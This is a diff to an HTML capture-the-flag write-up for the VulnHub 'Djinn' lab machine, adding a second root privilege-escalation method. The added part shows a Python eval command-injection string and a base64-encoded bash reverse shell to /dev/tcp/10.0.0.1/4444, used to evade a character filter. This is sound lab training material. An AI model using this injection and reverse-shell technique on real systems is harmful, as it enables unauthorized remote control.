@@ -120,7 +120,7 @@ sam@djinn:~$ sudo /root/lago&#13;&#10;What do you want to do ?&#13;&#10;1 - Be n
 
 
     <br>
-    <h2>Privesc Method #2 - Root</h2>
+    <h2>Privesc Method #1 - Root</h2>
 
     <li>There is a file named ".pyc" in Sam's home directory that looks like the source code behind /root/lago.  I initially use the command "strings" to examine the file contents.</li>
 
@@ -208,6 +208,50 @@ uid=0(root) gid=0(root) groups=0(root)
     </pre>
     
     <li>Root shell achieved.</li>
+
+    <br>
+    <h2>Privesc Method #2 - Root</h2>
+
+    <li>The alternative route to root is through port 1337.  Port 1337 presents ius with a math game</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/Documents/VulnHub/Djinn]
+└─$ nc -nv 10.0.0.20 1337
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Connected to 10.0.0.20:1337.
+  ____                        _____ _                
+ / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
+| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
+| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
+ \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
+                                                     
+
+Let's see how good you are with simple maths
+Answer my questions 1000 times and I'll give you your gift.
+(8, '/', 2)
+> 
+    </pre>
+
+    <li>We can test command injection by entering math commands</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Djinn]&#13;&#10;&boxur;&HorizontalLine;$ nc -nv 10.0.0.20 1337                                                                                                                                                                                                                                                                                               130 &Cross;&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Connected to 10.0.0.20:1337.&#13;&#10;  ____                        _____ _                &#13;&#10; / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ &#13;&#10;| |  _ / _` | &apos;_ ` _ \ / _ \   | | | | &apos;_ ` _ \ / _ \&#13;&#10;| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/&#13;&#10; \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|&#13;&#10;                                                     &#13;&#10;&#13;&#10;Let&apos;s see how good you are with simple maths&#13;&#10;Answer my questions 1000 times and I&apos;ll give you your gift.&#13;&#10;(8, &apos;+&apos;, 9)&#13;&#10;&gt; 17&#13;&#10;(2, &apos;/&apos;, 1)&#13;&#10;&gt; 2/1&#13;&#10;(4, &apos;/&apos;, 5)&#13;&#10;&gt; 10&#13;&#10;Wrong answer
+    </pre>
+
+    <li>The program gives us a new problem when we answer the math problem correctly.  When I enter a math problem mirroring the one we are presented with, the program accepts it as a correct answer.  Therefore, it looks like the program is processing my input as a command.  Which leads me to believe we can inject some other malicious command.</li>
+    <ul>
+        <li>I use this to inject commands: eval(&apos;__import__(&quot;os&quot;).system(&quot;&lt;command&gt;&quot;)&apos;)</li>
+    </ul>
+    
+    <li>The program is filtering for certain characters such as "{".  If it detects on of those charcters the program tells us to stop acting like a hacker.  So I generate a base64 encoded reverse shell.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Djinn]&#13;&#10;&boxur;&HorizontalLine;$ echo -n &quot;bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&apos;&quot; | base64                                                                                 130 &Cross;&#13;&#10;YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEn
+    </pre>
+
+    <li>Then I inject it into the program and gain a root shell.</li>
+
+    <img src="../images/djinn/root_method2.png">
 
 </body>
 </html>
